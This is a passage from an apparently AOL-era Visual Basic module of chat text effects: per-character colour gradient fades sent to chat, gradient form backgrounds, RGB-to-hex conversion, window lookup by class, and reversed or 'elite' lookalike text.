    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldRedBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldRedGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldRedYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldYellowBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldYellowGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldYellowPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldYellowRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function


'Pre-set 3 Color fade combinations begin here


Function BoldBlackBlueBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><U><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function
Function BoldBlackBlueBlack2(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   UnderLineSendChat (Msg)
End Function
Function BoldBlackGreenBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlackGreyBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function Bolditalic_BlackPurpleBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font face= " & Chr(34) & "arial" & Chr(34) & "><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldBlackRedBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlackYellowBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlueBlackBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueGreenBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function Bolditalic_BluePurpleBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & H & ">" & d
    Next b
 SendChat (Msg)
End Function

Function BoldBlueRedBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlueYellowBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldGreenBlackGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (Msg)
End Function

Function BoldGreenBlueGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function BoldGreenPurpleGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
SendChat (Msg)
End Function

Function BoldGreenRedGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function


Function BoldGreenYellowGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (Msg)
End Function

Function BoldGreyBlackGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyBlueGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyGreenGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyPurpleGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyRedGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyYellowGrey(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldPurpleBlackPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleBluePurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreenPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleRedPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldPurpleRedPurple = (Msg)
End Function

Function BoldPurpleYellowPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldPurpleYellowPurple = (Msg)
End Function

Function RedBlackRed2(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><U><Font Color=#" & H & ">" & d
    Next b
  SendChat (Msg)
End Function
Function BoldRedBlackRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function
Function BoldRedBlueRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldRedGreenRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldRedPurpleRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedYellowRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowBlackYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowBlueYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowGreenYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowPurpleYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowRedYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function


'Preset 2-3 color fade hexcode generator


Function RGBtoHEX(RGB)
    a = Hex(RGB)
    b = Len(a)
    If b = 5 Then a = "0" & a
    If b = 4 Then a = "00" & a
    If b = 3 Then a = "000" & a
    If b = 2 Then a = "0000" & a
    If b = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub



Function TwoColors(text, red1, green1, blue1, red2, green2, blue2, Wavy As Boolean)
    C1BAK = c1
    C2BAK = c2
    C3BAK = c3
    C4BAK = c4
    C = 0
    o = 0
    o2 = 0
    q = 1
    Q2 = 1
    For X = 1 To Len(text)
        BVAL1 = red2 - red1
        BVAL2 = green2 - green1
        BVAL3 = blue2 - blue1
        
        val1 = (BVAL1 / Len(text) * X) + red1
        val2 = (BVAL2 / Len(text) * X) + green1
        VAL3 = (BVAL3 / Len(text) * X) + blue1
        
        c1 = RGB2HEX(val1, val2, VAL3)
        c2 = RGB2HEX(val1, val2, VAL3)
        c3 = RGB2HEX(val1, val2, VAL3)
        c4 = RGB2HEX(val1, val2, VAL3)
        
        If c1 = c2 And c2 = c3 And c3 = c4 And c4 = c1 Then C = 1: Msg = Msg & "<FONT COLOR=#" + c1 + ">"
        If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
        
        If C <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        
        If Wavy = True Then
            If o2 = 1 Then Msg = Msg + "<SUB>"
            If o2 = 3 Then Msg = Msg + "<SUP>"
            Msg = Msg + Mid$(text, X, 1)
            If o2 = 1 Then Msg = Msg + "</SUB>"
            If o2 = 3 Then Msg = Msg + "</SUP>"
            If Q2 = 2 Then
                q = 1
                Q2 = 1
                If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
                If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
                If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
                If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
            End If
        ElseIf Wavy = False Then
            Msg = Msg + Mid$(text, X, 1)
            If Q2 = 2 Then
            q = 1
            Q2 = 1
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        End If
nc:     Next X
    c1 = C1BAK
    c2 = C2BAK
    c3 = C3BAK
    c4 = C4BAK
    BoldSendChat (Msg)
End Function

Function ThreeColors(text As String, red1, green1, blue1, red2, green2, blue2, red3, green3, blue3, Wavy As Boolean)



    d = Len(text)
        If d = 0 Then GoTo THEEnd
        If d = 1 Then fade1 = text
    For X = 2 To 500 Step 2
        If d = X Then GoTo Evens
    Next X
    For X = 3 To 501 Step 2
        If d = X Then GoTo Odds
    Next X
Evens:
    C = d \ 2
    fade1 = Left(text, C)
    fade2 = Right(text, C)
    GoTo THEEnd
Odds:
    C = d \ 2
    fade1 = Left(text, C)
    fade2 = Right(text, C + 1)
THEEnd:
    LA1 = fade1
    LA2 = fade2
        If Wavy = True Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), red1, green1, blue1, red2, green2, blue2, True) + TwoColors(Right(LA1, 1), red2, green2, blue2, red2, green2, blue2, True)
        If Wavy = False Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), red1, green1, blue1, red2, green2, blue2, False) + TwoColors(Right(LA1, 1), red2, green2, blue2, red2, green2, blue2, False)
        If Wavy = True Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), red2, green2, blue2, red3, green3, blue3, True) + TwoColors(Right(LA2, 1), red3, green3, blue3, red3, green3, blue3, True)
        If Wavy = False Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), red2, green2, blue2, red3, green3, blue3, False) + TwoColors(Right(LA2, 1), red3, green3, blue3, red3, green3, blue3, False)
    Msg = FadeA + FadeB
  BoldSendChat (Msg)
End Function

Function RGB2HEX(r, G, b)
    Dim X&
    Dim XX&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = b
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = r
        For XX& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next XX&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function

Function TrimSpaces(text)
    If InStr(text, " ") = 0 Then
    TrimSpaces = text
    Exit Function
    End If
    For TrimSpace = 1 To Len(text)
    thechar$ = Mid(text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function


Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
room% = firs%
FindChildByClass = room%

End Function
Function Bold_italic_colorR_Backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextChr$ & newsent$
Loop
BoldRedBlackRed (newsent$)
End Function


Function r_elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If nextChr$ = "A" Then Let nextChr$ = "/\"
If nextChr$ = "a" Then Let nextChr$ = "å"
If nextChr$ = "B" Then Let nextChr$ = "ß"
If nextChr$ = "C" Then Let nextChr$ = "Ç"
If nextChr$ = "c" Then Let nextChr$ = "¢"
If nextChr$ = "D" Then Let nextChr$ = "Ð"
If nextChr$ = "d" Then Let nextChr$ = "ð"
If nextChr$ = "E" Then Let nextChr$ = "Ê"
If nextChr$ = "e" Then Let nextChr$ = "è"
If nextChr$ = "f" Then Let nextChr$ = "ƒ"
If nextChr$ = "H" Then Let nextChr$ = "|-|"
If nextChr$ = "I" Then Let nextChr$ = "‡"
If nextChr$ = "i" Then Let nextChr$ = "î"
If nextChr$ = "k" Then Let nextChr$ = "|‹"
If nextChr$ = "L" Then Let nextChr$ = "£"
If nextChr$ = "M" Then Let nextChr$ = "]V["
If nextChr$ = "m" Then Let nextChr$ = "^^"
If nextChr$ = "N" Then Let nextChr$ = "/\/"
If nextChr$ = "n" Then Let nextChr$ = "ñ"
If nextChr$ = "O" Then Let nextChr$ = "Ø"
If nextChr$ = "o" Then Let nextChr$ = "ö"
If nextChr$ = "P" Then Let nextChr$ = "¶"
If nextChr$ = "p" Then Let nextChr$ = "Þ"
If nextChr$ = "r" Then Let nextChr$ = "®"
If nextChr$ = "S" Then Let nextChr$ = "§"
If nextChr$ = "s" Then Let nextChr$ = "$"
If nextChr$ = "t" Then Let nextChr$ = "†"
If nextChr$ = "U" Then Let nextChr$ = "Ú"
